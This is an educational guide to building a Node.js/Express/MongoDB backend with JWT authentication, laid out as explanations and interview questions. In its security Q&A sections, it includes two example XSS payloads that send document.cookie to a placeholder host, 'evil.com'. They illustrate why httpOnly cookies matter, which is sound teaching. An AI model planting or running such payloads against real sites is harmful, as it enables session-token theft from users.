Before You Write Code — The Mental Model

What is a backend? What problem does it actually solve? Start here before touching any code.

Frontend vs Backend vs Database

Frontend = What the user sees. HTML, CSS, JavaScript in the browser.
Backend = What the user doesn't see — but needs. Logic, data, security.
Database = Long-term storage. Data lives here when the server is off.

How a Request Travels

Browser clicks a button → HTTP Request (POST /api/v1/users/login) → Express Router matches the URL → Middleware runs (cors check, body parse, auth guard...) → Controller runs the business logic → Mongoose queries MongoDB → Controller sends a Response → Browser receives JSON → updates UI

What Each Technology Does

Node.jsRuns JavaScript on the server (not in browser)No server runtime
Express.jsThin wrapper over Node's http module — gives you routing and middlewareWrite raw http.createServer() with 1000 lines
MongooseODM — adds schema, validation, methods on top of raw MongoDBMongoDB stores any shape — no validation, no methods
JWTStateless authentication tokens — verifiable without a DB callNeed to store session in DB for every request
MulterHandles file uploads — parses multipart/form-datareq.files is undefined, can't receive files
CloudinaryCloud image/video storage with CDNStore files on server disk — not scalable

REST Principles

Stateless — server doesn't remember previous requests. Every request carries all the info needed.
Resource-based URLs — /users, /videos (nouns, not verbs like /getUser).
Correct HTTP verbs — GET (read), POST (create), PUT/PATCH (update), DELETE (delete).
Versioning — /api/v1/ so future breaking changes don't break old clients.

Interview Q

"Explain what happens when you make an API call from frontend to backend." — Walk through the full flow: HTTP request → routing → middleware → controller → DB → response. Don't skip steps.

"What is REST? What makes an API RESTful?" — Stateless, resource URLs, correct verbs, standard status codes.

Folder-by-Folder: Why These Exact Folders?

Key Principle

Separation of Concerns — each folder has ONE job. A controller doesn't know about DB indexes. A route doesn't run business logic. A util doesn't import Express. If something is in the wrong folder, it becomes hard to find, test, and change.

  • controllers/ — If ALL code was in one file it'd be 5000+ lines. Split by resource: one file per entity (user, video, comment...)
  • models/ — Data shape and DB methods live together. The model knows its own data. Controllers don't need to know about bcrypt or JWT.
  • routes/ — URL map is separate from logic. You can read ALL routes in 20 lines without seeing business logic.
  • middlewares/ — Things that run between request and controller: auth check, file upload, logging. Reusable across many routes.
  • utils/ — Pure helper functions. No Express, no Mongoose imports. Could be used in any project. Easily unit-tested.
  • db/ — Connection logic isolated. One file, one responsibility. Easy to mock in tests.
  • public/temp/ — Multer saves files here before Cloudinary upload. Always deleted after — it's a transit zone, not storage.

Server Boot Sequence

Exactly what happens from node src/index.js to the server being ready for requests.

$ node src/index.js STEP 1: dotenv.config({ path: './.env' }) → Reads .env file → Loads all KEY=VALUE into process.env → Now process.env.PORT, MONGODB_URL, etc. are available STEP 2: import { app } from "./app.js" runs → Express app is created → app.use(cors({ origin: CORS_ORIGIN, credentials: true })) → app.use(express.json({ limit: "16kb" })) ← parse JSON body → app.use(express.urlencoded({ extended: true })) ← parse form data → app.use(express.static("public")) ← serve /public folder → app.use(cookies()) ← parse cookies → app.use("/api/v1/users", userRouter) ← mount routes STEP 3: connectDB() is called → mongoose.connect(MONGODB_URL + "/" + DB_NAME) → If SUCCESS → app.listen(PORT) → "Server running on port 8000" → If FAILURE → process.exit(1) → crash intentionally

Why This Order Matters

  • dotenv first — every import after it needs process.env.*. Load it before anything that reads env vars.
  • DB before listen — if DB fails, starting the HTTP server is pointless. Fail fast, fail loudly.
  • process.exit(1) not just throw — exit code 1 signals error to process managers (PM2, Docker) so they can restart the service automatically.
  • Middleware before routes — express.json() must be registered before the routes that need req.body.
Interview Q

"What does express.json() do? What happens without it?" — It parses the incoming JSON request body and populates req.body. Without it, req.body is undefined — every controller that reads body fields gets undefined.

"What does express.urlencoded() do?" — Parses HTML form data (application/x-www-form-urlencoded). The extended: true option allows nested objects. Needed when forms POST data — without it, form fields don't appear in req.body.

"What does process.exit(1) mean?" — Terminates the Node process. Exit code 1 = error. Exit code 0 = clean exit. Process managers watch exit codes to decide if they should restart.

Utils — The Foundation Layer

Build these first. Everything else depends on them. Pure functions — no Express, no Mongoose.

asyncHandler.js — The Most Important Util

utils/asyncHandler.js
// Without asyncHandler — every controller looks like this:
// const someController = async (req, res) => {
//   try { ...logic... } catch(err) { res.status(500).json({error: err.message}) }
// }

// With asyncHandler — controllers have zero try/catch:
const asyncHandler = (fn) => (req, res, next) => {
  Promise.resolve(fn(req, res, next)).catch(next)
  // .catch(next) = caught errors go to Express error handler via next(error)
}

The trick: catch(next) calls next(error) automatically on any thrown error. Express then routes it to a global error handler. Forgetting try/catch in one controller no longer crashes the server.

apiError.js — Custom Error Class

utils/apiError.js
class ApiError extends Error {
  constructor(statusCode, message) {
    super(message)          // sets this.message + this.stack (from Error)
    this.code    = statusCode
    this.success = false
    this.data    = null
  }
}

// Usage in any controller or middleware:
throw new ApiError(401, "Unauthorized")
throw new ApiError(400, "All fields are required")

Why extends Error? You get the stack trace automatically, instanceof ApiError checks work, and it integrates with Express's error handling pipeline properly.

apiResponse.js — Standard Envelope

utils/apiresponse.js
class ApiResponse {
  constructor(statusCode, message, data) {
    this.statusCode = statusCode
    this.message    = message
    this.data       = data
    this.success    = statusCode >= 200 && statusCode < 400  // auto-computed
  }
}
// Every success response looks like: { statusCode, message, data, success: true }

cloudinary.js — Two-Step Upload

Client sends file → Multer receives multipart/form-data → Saves to ./public/temp/uniquename.jpg (local disk) → cloudinary.uploader.upload(localPath) → Cloudinary stores it on cloud CDN → Returns response with .url → fs.unlinkSync(localPath) (delete local copy — success OR fail) → Controller uses response.url to save in DB
Senior Dev Says

Always delete the temp file in BOTH the success and failure paths. If upload fails and you don't delete, public/temp/ fills up silently. On a server with limited disk space, this causes a crash days later with no obvious cause. The project handles this correctly — notice the fs.unlinkSync in both try and catch.

Interview Q

"Why create a custom error class instead of calling res.status().json() everywhere?" — Consistency: all error responses have the same shape. Separation: controllers throw errors, middleware/error handler sends responses. Reusability: one throw works from anywhere in the call stack — model methods, utils, controllers.

"Why store files locally before uploading to cloud?" — Cloudinary SDK needs a file path on disk. Multer gives you that path. You can't stream the multipart upload directly to Cloudinary without extra complexity. The two-step pattern is the standard approach.

Models — Designing Your Data

Mongoose schemas, pre-save hooks, instance methods. Build models before controllers — controllers depend on models, not vice versa.

What is a Mongoose Schema?

MongoDB itself stores any JSON — zero enforcement. Mongoose adds at the application level: type validation, required fields, unique constraints, indexes, default values, and custom methods. Think of a schema as the contract your data must obey before it touches the DB.

user.model.js — Field by Field

FieldOptions UsedWhy
usernameunique, lowercase, index:trueindex:true creates a B-tree index in MongoDB → fast search. lowercase ensures case-insensitive uniqueness.
emailunique, lowercaseDB-level uniqueness — enforced even if app-level check is bypassed
passwordrequiredOnly stores bcrypt hash. Raw password NEVER saved.
refreshTokenString (optional)Stored in DB so logout can invalidate it. Absent = logged out.

timestamps:true(schema option)Auto-adds createdAt and updatedAt to every document

The pre("save") Hook

models/user.model.js
userSchema.pre("save", async function() {
  if (!this.isModified("password")) return  // ← CRITICAL guard
  this.password = await bcrypt.hash(this.password, 10)
})

Without isModified check: updating username or email would re-hash the already-hashed password string. The new hash would be a hash of the old hash. Next login attempt: bcrypt.compare(plaintext, hash_of_hash) → always false → login permanently broken.

Salt rounds 10: higher = slower hash = harder to brute-force. 10 is the industry standard — takes ~100ms per hash, which is imperceptible to users but expensive to attack at scale.

Instance Methods — Why on the Model

MethodLives on model because...
getAccessToken()Needs this._id, this.email, etc. — belongs to the user object
getRefreshToken()Same — data method on its data owner
isPasswordCorrect()Needs this.password (the stored hash) — data logic lives with data

Controllers stay thin and readable. Methods are reusable. If you put bcrypt.compare in the controller, every controller that checks passwords duplicates that logic.

Interview Q

"What is a Mongoose pre-save hook?" — A function that runs before every .save() call. Common uses: hash passwords, generate slugs, update timestamps. Use this.isModified(field) to only run when the relevant field changed.

"What is populate() in Mongoose?" — Replaces an ObjectId reference with the actual document from the referenced collection. Like a SQL JOIN but at the application layer. Example: User.findById(id).populate("watchHistory") replaces video IDs with full video objects.

"What is the difference between instance methods and static methods?" — Instance methods (userSchema.methods.fn) are called on a document instance: user.isPasswordCorrect(). Static methods (userSchema.statics.fn) are called on the Model itself: User.findByEmail().

Middlewares — The Checkpoint System

What middleware IS, how the chain works, verifyJWT line by line, and multer explained.

The Middleware Chain

Incoming Request → cors() → checks origin header, sets CORS response headers → next() → json() → parses JSON body → populates req.body → next() → urlencoded() → parses form data → populates req.body → next() → cookie-parser() → parses Cookie header → populates req.cookies → next() → [route match] → verifyJWT() → reads token → verifies → sets req.user → next() → controller() → runs business logic → res.json() → DONE

Each step either calls next() to continue, or calls res.json() to stop and respond. next(error) skips remaining steps and jumps to the error handler.

verifyJWT — Line by Line

middlewares/auth.middlewares.js
export const verifyJWT = asyncHandler(async(req, res, next) => {
  // 1. Read token from cookie (browser) OR Authorization header (mobile/Postman)
  const token = req.cookies?.accessToken
             || req.header("Authorization")?.replace("Bearer ", "")

  if (!token) throw new ApiError(401, "Unauthorized request")

  // 2. Verify signature + expiry. Throws if invalid or expired.
  const decodeToken = jwt.verify(token, process.env.ACCESS_TOKEN_SECRET)

  // 3. Get fresh user from DB (token only carries _id)
  const user = await User.findById(decodeToken?._id)
                         .select("-password -refreshToken")

  if (!user) throw new ApiError(401, "Invalid Access Token")

  // 4. Attach user to request — next handler uses req.user for free
  req.user = user
  next()
})

Why two token sources? Browsers send cookies automatically. Mobile apps and Postman use Authorization: Bearer token headers. Supporting both makes the API usable from all clients.

Why attach to req.user? The logout controller needs user._id. Without req.user, it would need a second DB query. This way the controller gets it for free.

multer.middlewares.js

  • diskStorage saves to disk. Alternative memoryStorage keeps in RAM — bad for large files (runs out of memory)
  • Filename: Date.now() + random + extension — unique timestamp ensures no collisions, path.extname() preserves the file type
  • 50MB limit: prevents API abuse — no one should upload a 1GB video through a form
Interview Q

"What is Express middleware?" — A function with (req, res, next) signature that runs between the incoming request and the route handler. It can modify req/res, end the request, or call next() to continue the chain.

"What is the difference between authentication and authorization?" — Authentication: proving WHO you are (login with password). Authorization: proving you're ALLOWED to do something (admin vs regular user). verifyJWT does authentication. Role-based access would do authorization.

"What's the difference between next() and next(error)?" — next() passes to the next middleware/handler in the chain. next(error) skips remaining middleware and jumps directly to Express's error handling middleware (4 arguments: err, req, res, next).

Controllers — Business Logic Layer

What controllers do, what they don't do, and each controller function explained with reasoning.

Controller's job: receive request → validate input → call model/utils → send response. Nothing more. No DB schema logic, no token config, no file upload config.

registerUser — Step by Step

  1. Extract fields from req.body
  2. Validate with [field1, field2].some(f => !f || f.trim() === "") — checks all fields at once with one line
  3. Check duplicate: User.findOne({ $or: [{ email }, { username }] }) — one DB query, handles both cases
  4. Get file paths: req.files?.avatar?.[0]?.path — multer sets req.files, not req.body
  5. Upload to Cloudinary → delete local file → get .url
  6. User.create() → pre-save hook runs → password auto-hashed
  7. Re-fetch with .select("-password -refreshToken") before sending response
Senior Dev Says

Why re-fetch the user after User.create() instead of using the returned object? The create() result includes the hashed password field. The .select("-password") call on the re-fetch ensures you never accidentally send the hash to the client, even if someone refactors the code later.

loginUser — Cookie Security

The options object explained
const options = {
  httpOnly: true,  // JS in browser CANNOT read this cookie → blocks XSS token theft
  secure:   true   // Cookie only sent over HTTPS → prevents man-in-the-middle
}
// Stored as variable because reused for both cookies — DRY principle
res.cookie("accessToken",  accessToken,  options)
res.cookie("refreshToken", refreshToken, options)

Why send token in both cookie AND JSON body? Cookies = browsers (auto-sent on every request). JSON body = mobile apps and Postman (they read headers/body, not cookies). One API serves both clients.

refreshAccessToken — Token Comparison

The critical check

if (incomingRefreshToken !== user.refreshToken)
  throw new ApiError(401, "Refresh Token is expired or used")

logoutUser

Interview Q

"What is XSS and how does httpOnly protect against it?" — XSS (Cross-Site Scripting): attacker injects JavaScript into your page. That script could run document.cookie to steal tokens. httpOnly makes the cookie invisible to JavaScript — document.cookie won't show it. The browser still sends it on requests, but no JS can read it.

"What is refresh token rotation?" — Every time you use a refresh token to get a new access token, you also get a NEW refresh token and the old one is invalidated (deleted from DB). If an attacker stole the old refresh token, it no longer works. This limits the window of attack.

Routes — The URL Map

Express Router, route structure, middleware on specific routes, and why we separate routes from controllers.

routes/user.router.js — the complete map
// URL → [middlewares] → controller
router.route("/register")    .post(upload.fields([...]), registerUser)
router.route("/login")       .post(loginUser)
router.route("/logout")      .post(verifyJWT, logoutUser)   // ← protected
router.route("/refresh-token").post(refreshAccessToken)

// Mounted in app.js as:
app.use("/api/v1/users", userRouter)

// Final URLs:
// POST /api/v1/users/register
// POST /api/v1/users/login
// POST /api/v1/users/logout
// POST /api/v1/users/refresh-token

Key Points

  • Route-level middleware array: [upload.fields(), registerUser] — multer runs first, sets req.files, then controller runs
  • verifyJWT only on logout — login/register don't need auth (obviously). Only protected operations need the guard.
  • Why /api/v1/? When you make breaking API changes, /api/v2/ can coexist with /api/v1/ while old clients migrate. Without versioning, every API change breaks clients.
  • Why separate Router from app.js? One Router per resource. app.js stays clean — just mounts routers. Hundreds of routes don't pile up in one file.
Interview Q

"Why do we use Express Router instead of putting all routes in app.js?" — Modularity. Each resource (users, videos, comments) gets its own router file. Routes are grouped logically, controllers are imported cleanly, and the main app.js stays readable.

Common Mistakes

10 real mistakes every beginner makes. Know them before you make them.

  • 01 Forgetting express.json()
    Symptom: req.body is undefined — all body fields are missing.
    Fix: Add app.use(express.json()) in app.js BEFORE mounting routes.
  • 02 Looking for uploaded files in req.body
    Symptom: File is undefined. Multer sets req.files, not req.body.
    Fix: Use req.files?.avatar?.[0]?.path. Also ensure upload.fields() is on the route.
  • 03 Returning user with password or refreshToken in response
    Symptom: API response exposes hashed password or refresh token.
    Fix: Always chain .select("-password -refreshToken") before sending user data.
  • 04 Saving to wrong field name (user.newRefreshToken)
    Symptom: Token never persists in DB — schema doesn't have that field. Silent failure.
    Fix: Must exactly match schema field: user.refreshToken = token.
  • 05 Not deleting temp files after Cloudinary upload
    Symptom: public/temp/ fills up silently → disk full days later → server crashes mysteriously.
    Fix: fs.unlinkSync(localPath) in BOTH the success path AND the catch block.
  • 06 Hardcoding secrets in code
    Symptom: jwt.sign(payload, "my-secret") — git history is permanent. Even if deleted, it's recoverable.
    Fix: Always use process.env.SECRET_NAME and store real values only in .env.
  • 07 Not calling next() in middleware
    Symptom: Request hangs forever — no response, no error, just a timeout.
    Fix: Every middleware must either call next(), next(error), or send a response. Never leave both paths unhandled.
  • 08 Calling next(error) AND res.json()
    Symptom: "Cannot set headers after they are sent to the client" error.
    Fix: Pick one. If you throw/next(error), don't also res.json(). The error handler will respond.
  • 09 Not using validateBeforeSave: false when saving refreshToken
    Symptom: Saving the refresh token re-validates all required fields → schema validation error.
    Fix: user.save({ validateBeforeSave: false }) — only skip when updating internal fields, not user-submitted data.
  • 10 Trusting client-sent user ID for protected routes
    Symptom: A user sends req.body.userId = "someOtherUserId" — gets another user's data.
    Fix: Always use req.user._id (set by verifyJWT from the verified token). Never trust IDs from request body on protected routes.

Express / Node.js
What is middleware? Explain the middleware chain with an example.
A function with (req, res, next) that runs between the incoming request and the route handler. Each middleware either calls next() to pass control forward, or ends the request with res.json().
// express.json() is literally this under the hood: (req, res, next) => { req.body = JSON.parse(rawBodyBuffer) // modify req next() // pass forward } // If you remove it: req.body → undefined (every controller that reads body breaks)
What is the difference between app.use() and router.use()?
app.use() registers middleware on the entire application — every route gets it. router.use() applies only to routes registered on that specific router instance.
app.use(cors()) // CORS for ALL routes app.use("/api/v1/users", userRouter) // Inside userRouter only: router.use(verifyJWT) // auth guard only for /api/v1/users/* routes
What happens when you call next(error) vs next()?
next() passes control to the next middleware in the chain. next(error) skips all remaining normal middleware and jumps directly to Express's 4-argument error handler.
// asyncHandler does this automatically: Promise.resolve(fn(req, res, next)).catch(next) // any throw inside the controller → next(error) → error handler sends response // Your error handler looks like: app.use((err, req, res, next) => { // 4 args = error handler res.status(err.code || 500).json({ message: err.message }) })
What does express.json() do? What happens without it?
Reads the raw request body buffer, parses it as JSON, and sets req.body. Without it, req.body is undefined — any controller reading body fields silently fails.
POST /login body: {"email":"t@t.com","password":"1234"} // Without express.json(): req.body → undefined req.body.email → TypeError: Cannot read property of undefined // With express.json(): req.body.email → "t@t.com" ✓
What is express.urlencoded() and when is it needed?
Parses HTML form data (Content-Type: application/x-www-form-urlencoded). Needed when an HTML <form> submits data — not JSON, but key=value pairs.
// HTML form submits: Content-Type: application/x-www-form-urlencoded Body: name=tejas&email=t%40t.com // With urlencoded({ extended: true }): req.body.name → "tejas" req.body.email → "t@t.com" // extended:true allows nested objects: user[name]=tejas
What is cookie-parser and why is it needed separately?
Express does not parse cookies by default. cookie-parser reads the Cookie request header, parses it, and populates req.cookies as an object.
// Without cookie-parser: req.cookies → undefined req.cookies.accessToken → TypeError ✗ // With app.use(cookieParser()): req.cookies.accessToken → "eyJhbGci..." ✓ // verifyJWT reads this to authenticate browser clients
What does process.exit(1) mean? When do you use it?
Terminates the Node process immediately. Exit code 1 = error. Exit code 0 = clean shutdown. Process managers (PM2, Docker) watch exit codes to decide whether to restart.
connectDB() .then(() => app.listen(PORT)) .catch((err) => { console.error("DB connection failed:", err) process.exit(1) // PM2 sees code 1 → restarts service }) // If you just throw, Node may stay running in a broken state
What is the difference between CommonJS (require) and ES Modules (import)?
CommonJS: require() is synchronous, runs at runtime. ES Modules: import is static, parsed before execution, supports tree-shaking. Set "type":"module" in package.json to use ESM.

MongoDB / Mongoose
What is the difference between SQL and NoSQL? When would you choose MongoDB?
SQL: structured tables, strict schema, joins. NoSQL (MongoDB): JSON documents, flexible schema, references instead of joins. Choose MongoDB when data structure varies per document, you need horizontal scaling, or you're already working with JSON.
// SQL: users table + videos table + JOIN on user_id // MongoDB: video document embeds owner: ObjectId("userId") // .populate("owner") fetches the user at app level // Choose MongoDB when: // - User profiles have optional/varying fields // - Storing JSON-heavy data (like config, logs) // - NOT ideal for: complex multi-table transactions, strict ACID
What is a Mongoose schema? What does it add over raw MongoDB?
MongoDB accepts any JSON with zero enforcement. A Mongoose schema adds type validation, required fields, unique constraints, default values, indexes, and custom methods — all at the application layer.
// Raw MongoDB — no schema, this works: db.users.insertOne({ anything: true, noEmail: true }) // Mongoose schema — this throws: await User.create({ anything: true }) // → ValidationError: email is required
What is a pre-save hook? What is the isModified() check for?
A function that runs before every .save(). isModified("password") returns true only if the password field changed in this operation — critical to prevent re-hashing an already-hashed value.
// Without isModified check: user.username = "newname" await user.save() // → pre-save hashes the already-hashed password AGAIN // → bcrypt.compare("rawPassword", hashOfHash) → false → login broken forever // With isModified: if (!this.isModified("password")) return // ← skip hashing on username update
What is populate() in Mongoose? How is it different from a SQL JOIN?
Replaces an ObjectId reference field with the actual document from the referenced collection. Unlike SQL JOINs (done in DB), populate makes separate DB queries — one to get the parent, another to get the referenced documents.
// watchHistory: [ObjectId("vid1"), ObjectId("vid2")] // Without populate: user.watchHistory → ["64abc...", "64def..."] (just IDs) // With populate: await User.findById(id).populate("watchHistory") user.watchHistory → [{ title: "Video 1", url: "..." }, ...] // SQL JOIN = 1 query. Mongoose populate = 2 queries (N+1 problem)
What is mongoose-aggregate-paginate? When is aggregation needed?
Plugin that adds .aggregatePaginate() for paginated aggregation pipeline queries. Use aggregation when you need to filter + sort + group + join in one DB operation (like a YouTube feed).
// Without pagination — loads ALL videos: const videos = await Video.find() // 50,000 videos → memory crash // With aggregatePaginate: Video.aggregatePaginate(pipeline, { page: 1, limit: 20 }) // → Returns 20 videos + totalDocs + totalPages + hasNextPage
What is the difference between instance methods and static methods in Mongoose?
Instance methods are called on a document — they access this (the current document). Static methods are called on the Model itself, not on a document.
// Instance method — called on a user object: userSchema.methods.isPasswordCorrect = function(pw) { return bcrypt.compare(pw, this.password) // needs 'this' } const user = await User.findById(id) await user.isPasswordCorrect("mypassword") // ← on instance // Static method — called on the Model: userSchema.statics.findByEmail = function(email) { return this.findOne({ email }) } await User.findByEmail("t@t.com") // ← on Model
What does index: true do on a schema field?
Creates a B-tree index in MongoDB on that field. Indexes make queries on that field dramatically faster — instead of scanning every document, MongoDB goes directly to the result.
// Without index on username (1 million users): User.findOne({ username: "tejas" }) // → Full collection scan: checks all 1,000,000 documents // With index: true: // → B-tree lookup: finds "tejas" in ~log(n) steps ≈ instant // Tradeoff: indexes speed up reads but slow down writes slightly // (index must be updated on every insert/update)
What is { validateBeforeSave: false } and when should you use it?
Skips Mongoose schema validation for that specific save. Use ONLY for internal field updates (like saving refreshToken) — never for user-submitted data, since that's where validation matters most.
// Without validateBeforeSave: false: user.refreshToken = newToken await user.save() // → ValidationError: avatar is required, fullname is required... // (re-validates ALL required fields even though we only touched refreshToken) // With it: await user.save({ validateBeforeSave: false }) // skips validation ✓
What does $unset do? How is it different from setting null?
$unset removes the field from the document entirely. $set: { field: null } keeps the field but sets its value to null — the field still exists in the document.
// After $set: { refreshToken: null }: { username: "tejas", refreshToken: null } // field exists, value is null // After $unset: { refreshToken: 1 }: { username: "tejas" } // field gone entirely // This project uses $unset on logout — cleaner, confirms logged-out state
Authentication & JWT
What is JWT? What are its 3 parts?
JSON Web Token — a signed string for stateless authentication. Three parts separated by dots: header.payload.signature. The payload is visible (base64) but tamper-proof (HMAC signature).
eyJhbGciOiJIUzI1NiJ9 . eyJfaWQiOiIxMjMifQ . abc123sig ↑ header (base64) ↑ payload (base64) ↑ signature (HMAC) decode header → { "alg": "HS256" } decode payload → { "_id": "123", "email": "t@t.com", "exp": 1735000000 } // Payload is NOT encrypted — don't put passwords here // Signature = HMAC(header + "." + payload, secret) — tamper-proof
What is the difference between an access token and a refresh token?
Access token: short-lived (1d), sent with every API request, contains user info, NOT stored in DB. Refresh token: long-lived (10d), stored in DB, used ONLY to get new access tokens when they expire.
// Access token expires (after 1 day): GET /api/v1/users/profile Authorization: Bearer expired_token → jwt.verify throws → 401 Unauthorized // Client uses refresh token to get new access token: POST /api/v1/users/refresh-token body: { refreshToken: "long_lived_token" } → returns new accessToken + new refreshToken ✓
Why store the refresh token in the database?
JWT is stateless — once issued, it's valid until expiry regardless of what happens. Storing in DB lets you "revoke" it: on logout, delete it from DB. Even a valid JWT signature fails if it doesn't match the DB copy.
// Scenario: user logs out, attacker has old refresh token logout() → $unset refreshToken from DB // Attacker tries refresh with old token: incomingToken = "old_valid_jwt" user.refreshToken = undefined // was $unset on logout "old_valid_jwt" !== undefined → 401 rejected ✓ // Without DB storage: valid signature = always accepted = logout is meaningless
What is refresh token rotation? Why is it more secure?
Every time you use a refresh token, you get a NEW refresh token and the old one is immediately invalidated. If an attacker steals a refresh token, it becomes useless after the legitimate user next refreshes.
T=0: attacker steals refresh_token_A T=1: legitimate user calls /refresh-token with token_A → server issues: access_token_NEW + refresh_token_B → refresh_token_A deleted from DB T=2: attacker tries refresh_token_A → token_A !== user.refreshToken (token_B) → 401 ✓ // Without rotation: one stolen token = permanent access until expiry
What is the difference between httpOnly and secure cookie flags?
httpOnly prevents JavaScript on the page from reading the cookie (blocks XSS). secure prevents the cookie from being sent over HTTP — only HTTPS (blocks network interception).
// XSS attack injects script into your page: document.location = "evil.com?stolen=" + document.cookie // With httpOnly: true: document.cookie → "" (accessToken not visible) ✓ // HTTP connection (no HTTPS) with secure: true: Browser silently does NOT send the cookie ✓ // Attacker sniffing HTTP traffic gets nothing
What is the difference between authentication and authorization?
Authentication: proving WHO you are (login, JWT verify). Authorization: proving you're ALLOWED to do something (roles, permissions). You must authenticate first, then authorize.
// Authentication — verifyJWT in this project: jwt.verify(token, secret) → confirms you are who you claim req.user = foundUser → identity established // Authorization — (not yet in project, but would look like): if (req.user.role !== "admin") throw new ApiError(403, "Forbidden") // 403 = authenticated but not allowed // 401 = not authenticated | 403 = authenticated, not authorized
Why send tokens in both cookie AND JSON response body?
Browser clients use cookies (auto-sent, httpOnly). Mobile apps and API clients (Postman) can't use httpOnly cookies easily — they read from response body and set Authorization header manually. One API needs to serve both.
// Browser (auto-cookie): res.cookie("accessToken", token, { httpOnly: true }) // Browser attaches cookie to every subsequent request automatically // Mobile app / Postman (reads body): res.json({ accessToken: token }) // Client stores it, sends: Authorization: Bearer <token> // verifyJWT handles both sources: req.cookies?.accessToken || req.header("Authorization")?.replace("Bearer ","")
Security
What is XSS and how does httpOnly protect against it?
XSS (Cross-Site Scripting): attacker injects malicious JavaScript into your page via user input fields, comments, or CDN compromise. That script can steal cookies, redirect users, or make requests on their behalf.
// Attacker posts this as a comment: <script>fetch("evil.com?c=" + document.cookie)</script> // Without httpOnly: accessToken appears in document.cookie → STOLEN // With httpOnly: true: document.cookie = "" (token invisible to all JS) // Attacker's script gets nothing ✓ // httpOnly does NOT protect against CSRF — that needs other measures
What is bcrypt? What is a salt? What are salt rounds?
bcrypt is a deliberately slow hashing algorithm — its slowness is the security feature. A salt is a unique random string added to the password before hashing. Salt rounds (10) = 2^10 = 1024 internal iterations.
// Same password, different salts → completely different hashes: bcrypt.hash("password123", 10) → "$2b$10$abc...xyz" bcrypt.hash("password123", 10) → "$2b$10$def...uvw" // different! // Salt is embedded in the hash string — compare() extracts it: bcrypt.compare("password123", storedHash) // → extracts salt from hash → re-hashes → compares → true/false // Salt rounds tradeoff: 10 ≈ 100ms (fine). 14 ≈ 1.5s (too slow for login)
What is a rainbow table attack? How does salting prevent it?
A rainbow table is a pre-computed lookup: {password → hash}. Without salting, hash("password123") is always the same — attacker looks it up instantly. Salting makes every hash unique, making the table useless.
// Without salt — MD5("password123") is always the same: rainbow_table["482c811da5d5b4bc6d497ffa98491e38"] → "password123" // Attacker queries table → instant crack // With bcrypt salt: user_A: bcrypt("password123" + saltA) → "hash_A" user_B: bcrypt("password123" + saltB) → "hash_B" (same password, different hash) // Rainbow table is useless — would need a unique table per user
Why should secrets never be hardcoded in source code?
Git history is permanent. Even if you delete the secret in the next commit, it exists in every previous commit. Anyone with repo access (or who ever cloned it) has your DB credentials, JWT secrets, and API keys forever.
// Hardcoded — visible in every git commit forever: jwt.sign(payload, "chai-aur-code") ✗ // Environment variable — not in code: jwt.sign(payload, process.env.ACCESS_TOKEN_SECRET) ✓ // Even if accidentally pushed: // 1. Rotate the secret immediately (generate new one) // 2. All existing JWTs signed with old secret → invalid → users re-login // 3. git filter-branch to scrub history (painful)
What is CORS? Why does the browser enforce it? How do you configure it?
CORS (Cross-Origin Resource Sharing): browsers block requests from one origin to another by default (same-origin policy). The server sends CORS headers to tell the browser which origins are allowed.
// Frontend on http://localhost:3000 calls API on http://localhost:8000: // Browser blocks: "CORS policy: No 'Access-Control-Allow-Origin' header" // In app.js: app.use(cors({ origin: process.env.CORS_ORIGIN, // "http://localhost:3000" credentials: true // allow cookies to be sent cross-origin })) // Note: origin: "*" works but disables credentials (cookies won't be sent)
What is a man-in-the-middle attack? How does secure: true help?
MITM: attacker sits between client and server on the same network (e.g., coffee shop WiFi) and reads unencrypted HTTP traffic. secure: true on cookies ensures they're only sent over HTTPS — HTTPS is encrypted, so the attacker reads nothing.
// HTTP (unencrypted) — attacker on same WiFi sees: Cookie: accessToken=eyJhbGci... ← plaintext, stolen instantly // With secure: true + HTTPS: Cookie only sent over HTTPS → traffic is TLS-encrypted // Attacker sees gibberish: Ωα9#∆£∑... ✓ // Note: secure:true has no effect on localhost (use it in production only)
API & Architecture Design
What is REST? What makes an API RESTful?
Architectural style with 5 rules: stateless, resource-based URLs, standard HTTP verbs, uniform interface, and responses indicate state. An API is RESTful when it follows these constraints consistently.
// NOT RESTful (verb in URL, wrong method): POST /getUser ✗ GET /deleteUser/1 ✗ // RESTful: GET /users ← list all POST /users ← create GET /users/:id ← get one PATCH /users/:id ← update DELETE /users/:id ← delete // Stateless: server has no memory of previous requests // Every request carries everything needed (JWT, body, params)
What is separation of concerns? Show me in this project.
Each module has ONE job and doesn't know about others' internals. If you need to change the ORM from Mongoose to Prisma, only the models change. Routes don't care about DB queries. Utils don't import Express.
// Route: only knows URL → handler mapping router.route("/logout").post(verifyJWT, logoutUser) // Middleware: only does JWT verification req.user = user; next() // Controller: only runs business logic $unset refreshToken, clearCookie, res.json(...) // Model: only knows data structure + data methods getRefreshToken() { return jwt.sign({_id}, secret) } // None of these import or know about the others' implementation ✓
What is the MVC pattern? How does this project implement it?
Model-View-Controller: Model handles data, View displays it, Controller handles user intent. In REST APIs, the "View" is the JSON response (no HTML templates needed).
// Model (M) → src/models/user.model.js Schema + bcrypt hook + getAccessToken() + getRefreshToken() // Controller (C) → src/controllers/user.controller.js registerUser, loginUser, logoutUser — business logic // View (V) → the JSON response itself res.json(new ApiResponse(200, "Logged in", { user, accessToken })) // Routes wire C to URLs. Middlewares protect C from unauthorized access.
What is a custom error class and why use one over res.status().json() everywhere?
throw new ApiError(401, "Unauthorized") works from anywhere in the call stack — model methods, utils, deeply nested functions. res.json() only works inside route handlers that have access to res.
// Problem with res.json() everywhere: const uploadAvatar = async (path) => { if (!path) res.status(400).json(...) // no 'res' here! ✗ } // With custom error class: const uploadAvatar = async (path) => { if (!path) throw new ApiError(400, "Avatar required") // works anywhere ✓ } // asyncHandler catches it → next(error) → error handler sends response
What is an API response envelope? Why is consistency important?
Wrapping every response in a standard shape: { statusCode, message, data, success }. Without it, every endpoint returns different shapes — frontend code becomes a mess of if-elses to handle each one.
// Without envelope — 3 endpoints, 3 shapes: POST /login → { user, token } GET /profile → { username, email, avatar } GET /videos → [{ title, url }] // Frontend: if(res.user)... if(res.username)... if(Array.isArray(res))... // With ApiResponse envelope — always the same: { statusCode: 200, message: "...", data: { ...anything }, success: true } // Frontend always reads: response.data — one pattern, zero guessing ✓
What is idempotency? Which HTTP methods should be idempotent?
Making the same request N times produces the same result as making it once. GET, PUT, DELETE should be idempotent. POST is NOT — calling POST /users twice creates two users.
// Idempotent — same result no matter how many times: DELETE /users/123 (1st call: deleted. 2nd call: already deleted, same state) GET /users/123 (always returns same user) PUT /users/123 { name: "Tejas" } (always sets to "Tejas") // NOT idempotent: POST /users { name: "Tejas" } (1st call: user_1. 2nd call: user_2 created) // Why it matters: network retry logic — safe to retry idempotent requests
